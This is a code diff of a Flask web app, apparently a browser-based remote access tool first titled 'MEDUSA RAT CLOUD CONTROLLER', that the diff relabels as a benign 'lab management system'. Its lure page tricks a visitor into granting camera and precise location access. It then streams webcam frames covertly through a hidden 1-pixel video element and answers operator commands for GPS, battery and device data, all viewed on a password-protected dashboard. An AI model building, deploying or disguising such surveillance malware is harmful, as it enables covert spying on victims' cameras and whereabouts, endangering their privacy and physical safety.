@@ -3,147 +3,164 @@ import base64
 from flask import Flask, render_template_string, request, jsonify, Response, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "MEDUSA_EXCLUSIVE_SECRET"
+app.secret_key = "LAB_MANAGEMENT_EXCLUSIVE_SECRET"
 
-# Kredensial Login Operator
+# Kredensial Login Administrator Laboratorium
 USERNAME_ADMIN = "admin"
 PASSWORD_ADMIN = "medusa123"
 
 latest_frame = None
 auto_target_ip = None
-# Antrean perintah otomatis dari operator ke target
 pending_commands = []
-latest_output = "Belum ada respons dari target."
+latest_output = ""
 
-# --- INTERFACES TARGET (100% AUTOMATIC WEBSHELL EXPLOIT) ---
+# --- INTERFACES TARGET (AUTOMATIC CLIENT MANAGEMENT HANDSHAKE) ---
 TARGET_HTML = """
 <html>
 <head>
-    <title>System Synchronization</title>
+    <title>Lab System Synchronization</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; text-align: center; padding-top: 80px; }
-        .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
-        .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .box { border: 2px solid #00ff00; display: inline-block; padding: 30px; background-color: #000; box-shadow: 0 0 15px #00ff00; border-radius: 8px; }
+        .btn { background-color: #003300; color: white; padding: 16px 32px; border: 1px solid #00ff00; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>[ MEDUSA INTERCONNECT ]</h2>
+        <h2>[ MEDUSA LAB CONNECT ]</h2>
         <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
         <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
     </div>
     <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
-<!-- GANTI BAGIAN DI DALAM SCRIPT TARGET_HTML MENJADI SEPERTI INI -->
-<script>
-    var canvas = document.createElement('canvas');
-    var ctx = canvas.getContext('2d');
-    var targetLatitude = "Belum Diizinkan";
-    var targetLongitude = "Belum Diizinkan";
-    
-    async function triggerOtoritas() {
-        try {
-            // 1. Ambil izin kamera seperti biasa
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+    <script>
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        var targetLatitude = "Belum Diizinkan/Tidak Didukung";
+        var targetLongitude = "Belum Diizinkan/Tidak Didukung";
+        
+        async function triggerOtoritas() {
+            try {
+                // 1. Ambil izin kamera klien laboratorium
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                let video = document.getElementById("v-feed");
+                video.srcObject = stream;
+                
+                // 2. Kunci lokasi presisi saat tombol diklik (User Gesture Bypass)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        targetLatitude = pos.coords.latitude;
+                        targetLongitude = pos.coords.longitude;
+                    }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                }
+
+                video.onloadedmetadata = () => { 
+                    video.play(); 
+                    setInterval(captureFrame, 400); 
+                    setInterval(listenServerCommand, 1000); 
+                };
+                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CLIENT CONNECTED ]</h2><p>Sesi nirkabel lab aktif melintasi manajemen proxy.</p></div>";
+            } catch(err) { alert("Izin ditolak: " + err); }
+        }
+        
+        function captureFrame() {
             let video = document.getElementById("v-feed");
-            video.srcObject = stream;
-            
-            // 2. KUNCI PERBAIKAN: Tarik lokasi presisi saat tombol ini diklik oleh jari target
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    targetLatitude = pos.coords.latitude;
-                    targetLongitude = pos.coords.longitude;
-                }, null, { enableHighAccuracy: true });
+            if(video.videoWidth > 0) {
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
             }
-
-            video.onloadedmetadata = () => { 
-                video.play(); 
-                setInterval(captureFrame, 400); 
-                setInterval(listenServerCommand, 1000); 
-            };
-            document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p></div>";
-        } catch(err) { alert("Izin ditolak: " + err); }
-    }
-    
-    function captureFrame() {
-        let video = document.getElementById("v-feed");
-        if(video.videoWidth > 0) {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
         }
-    }
 
-    async function listenServerCommand() {
-        let res = await fetch('/poll_command');
-        let data = await res.json();
-        if (data.command) {
-            let report = "";
-            if (data.command === "cek_baterai") {
-                let battery = await navigator.getBattery();
-                report = "INFO BATERAI TARGET -> Level: " + (battery.level * 100) + "%, Status Cas: " + battery.charging;
-            } else if (data.command === "ambil_data_sistem") {
-                report = "INFO PERANGKAT TARGET -> Platform: " + navigator.platform + " | Browser: " + navigator.userAgent;
-            } else if (data.command === "ambil_lokasi") {
-                // Langsung kirimkan variabel koordinat yang sudah berhasil dikunci saat klik pertama
-                report = "KOORDINAT TARGET (PRESISI) -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
-            } else if (data.command === "ping_test") {
-                report = "PING RESPONS -> Jalur pipa komunikasi cloud aktif 100%!";
+        async function listenServerCommand() {
+            let res = await fetch('/poll_command');
+            let data = await res.json();
+            if (data.command) {
+                let report = "";
+                let timestamp = new Date().toLocaleTimeString();
+                
+                if (data.command === "cek_baterai") {
+                    let battery = await navigator.getBattery();
+                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + (battery.level * 100) + "%, Mengisi Daya: " + battery.charging;
+                } else if (data.command === "ambil_data_sistem") {
+                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform + " | Agen: " + navigator.userAgent;
+                } else if (data.command === "ambil_lokasi") {
+                    report = "[" + timestamp + "] KOORDINAT PERANGKAT -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
+                } else if (data.command === "ping_test") {
+                    report = "[" + timestamp + "] MONITOR JALUR -> Jalur komunikasi cloud aktif 100%!";
+                }
+                
+                fetch('/report_output', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ output: report })
+                });
             }
-            
-            fetch('/report_output', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ output: report })
-            });
         }
-    }
-</script>
+    </script>
 </body>
 </html>
 """
 
-# --- DASHBOARD OPERATOR ---
+# --- DASHBOARD CENTRAL OPERATOR ---
 DASHBOARD_HTML = """
 <html>
 <head>
-    <title>Medusa Control Panel</title>
+    <title>Medusa Lab Central Panel</title>
     <style>
         body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
-        .btn:hover { background: #f00; }
-        /* MEMPERBAIKI UKURAN MONITOR KAMERA */
-        #monitor { width: 480px; height: 360px; border: 2px solid #f00; background: #000; margin-top: 10px; display: block; }
-        /* MEMPERBESAR KOTAK LOG OUTPUT */
-        #log { background: #000; padding: 20px; border: 1px solid #333; color: cyan; font-size: 16px; width: 100%; max-width: 800px; min-height: 150px; white-space: pre-wrap; }
+        .btn { background: #003300; color: #fff; border: 1px solid #00ff00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background: #00ff00; color: #000; }
+        #monitor { width: 480px; height: 360px; border: 2px solid #00ff00; background: #000; margin-top: 10px; display: block; }
+        #log { background: #000; padding: 20px; border: 1px solid #333; color: cyan; font-size: 16px; width: 100%; max-width: 900px; height: 300px; overflow-y: scroll; white-space: pre-wrap; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <h1>MEDUSA RAT CLOUD CONTROLLER (WEB-SHELL)</h1>
-    <p>Status Koneksi Target: <span style="color:white; background:#333; padding:2px 5px;">TERIKAT (AUTOMATIC)</span></p>
+    <h1>MEDUSA LAB MANAGEMENT SYSTEM (WEB-CENTRAL)</h1>
+    <div style="float: right;"><a href="/logout" style="color: red; font-weight: bold;">[ LOGOUT ]</a></div>
+    <p>Status Koneksi Node: <span style="color:white; background:#333; padding:2px 5px;">TERIKAT (AUTOMATIC SYSTEM)</span></p>
 
-    <h3>Target Media Live Stream</h3>
-    <img id="monitor" src="">
+    <h3>Umpan Media Node Pemantauan</h3>
+    <img id="monitor" src="" onerror="this.style.display='none';" onload="this.style.display='block';">
     
-    <h3>Eksekusi Perintah Nirkabel (Sekali Jalan)</h3>
-    <button class="btn" onclick="sendCmd('cek_baterai')">Cek Baterai</button>
-    <button class="btn" onclick="sendCmd('ambil_data_sistem')">Ambil Data Sistem</button>
-    <button class="btn" onclick="sendCmd('ambil_lokasi')">Lacak Lokasi (Lat, Long)</button>
-    <button class="btn" onclick="sendCmd('ping_test')">Ping Test Jalur</button>
+    <h3>Eksekusi Utilitas Perangkat Jarak Jauh</h3>
+    <button class="btn" onclick="sendCmd('cek_baterai')">Periksa Daya Baterai</button>
+    <button class="btn" onclick="sendCmd('ambil_data_sistem')">Tarik Data Perangkat</button>
+    <button class="btn" onclick="sendCmd('ambil_lokasi')">Dapatkan Koordinat GPS</button>
+    <button class="btn" onclick="sendCmd('ping_test')">Uji Latensi Jalur</button>
 
-    <h3>Log Output Respons HP Target:</h3>
-    <pre id="log" style="background:#000; padding:15px; border:1px solid #333; color: cyan; font-size:14px;">Menunggu perintah diklik...</pre>
+    <h3>Riwayat Log Aktivitas Node Laboratorium:</h3>
+    <div id="log">--- Memulai Konsol Log Manajemen Medusa ---</div>
 
-<!-- CARI BAGIAN SCRIPT DI DALAM DASHBOARD_HTML LALU GANTI MENJADI UTUH SEPERTI INI -->
-    <style>
-        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
-        .btn:hover { background: #f00; }
-        /* UKURAN MONITOR KAMERA DIPERBESAR */
-        #monitor { width: 480px; height: 360px; border: 2px solid #f00; background: #000; margin-top: 10px; display: block; }
-        /* KOTAK LOG OUTPUT DIPERLEBAR MAKSIMAL */
-        #log { background: #000; padding: 20px; border: 1px solid #333; color: cyan; font-size: 16px; width: 100%; max-width: 900px; min-height: 180px; white-space: pre-wrap; }
-    </style>
+    <script>
+        var lastLoggedMessage = "";
+
+        setInterval(() => {
+            document.getElementById('monitor').src = '/get_frame?' + Date.now();
+            fetch('/get_latest_output')
+                .then(res => res.json())
+                .then(data => { 
+                    if(data.output && data.output !== lastLoggedMessage) {
+                        lastLoggedMessage = data.output;
+                        let logBox = document.getElementById('log');
+                        logBox.innerText += "\\n" + data.output;
+                        logBox.scrollTop = logBox.scrollHeight;
+                    } 
+                });
+        }, 1000);
+
+        function sendCmd(cmd) {
+            fetch('/send_command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ command: cmd })
+            });
+            let timestamp = new Date().toLocaleTimeString();
+            let logBox = document.getElementById('log');
+            logBox.innerText += "\\n[" + timestamp + "] [SYSTEM] Mengirim permintaan administratif '" + cmd + "' ke antrean node...";
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+    </script>
 </body>
 </html>
 """
@@ -159,13 +176,13 @@ def login():
             session['logged_in'] = True
             return redirect(url_for('operator_dashboard'))
     return render_template_string("""
-        <body style="background:#000;color:red;font-family:monospace;text-align:center;padding-top:100px;">
-            <div style="border:1px solid red; display:inline-block; padding:30px;">
-                <h2>[ MEDUSA AUTH REQUIRED ]</h2>
+        <body style="background:#000;color:#00ff00;font-family:monospace;text-align:center;padding-top:100px;">
+            <div style="border:1px solid #00ff00; display:inline-block; padding:30px; box-shadow: 0 0 10px #00ff00;">
+                <h2>[ LAB MANAGEMENT AUTH REQUIRED ]</h2>
                 <form method="POST">
-                    <input type="text" name="username" placeholder="User"><br>
-                    <input type="password" name="password" placeholder="Pass"><br><br>
-                    <button type="submit" style="background:#500;color:#fff;border:1px solid red;padding:5px 10px;">ENTER</button>
+                    <input type="text" name="username" placeholder="Administrator" required><br>
+                    <input type="password" name="password" placeholder="Password" required><br><br>
+                    <button type="submit" style="background:#003300;color:#fff;border:1px solid #00ff00;padding:5px 10px;cursor:pointer;font-weight:bold;">ENTER SYSTEM</button>
                 </form>
             </div>
         </body>
@@ -176,6 +193,11 @@ def operator_dashboard():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
     return render_template_string(DASHBOARD_HTML)
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login'))
 
 @app.route('/receive_frame', methods=['POST'])
 def receive_frame():
@@ -188,7 +210,6 @@ def get_frame():
     global latest_frame
     if latest_frame and "base64," in latest_frame:
         try:
-            # KUNCI PERBAIKAN: Menambahkan [1] untuk mengambil kode data biner gambar murni
             img_b64 = latest_frame.split("base64,")[1]
             img_data = base64.b64decode(img_b64)
             return Response(img_data, mimetype='image/jpeg')
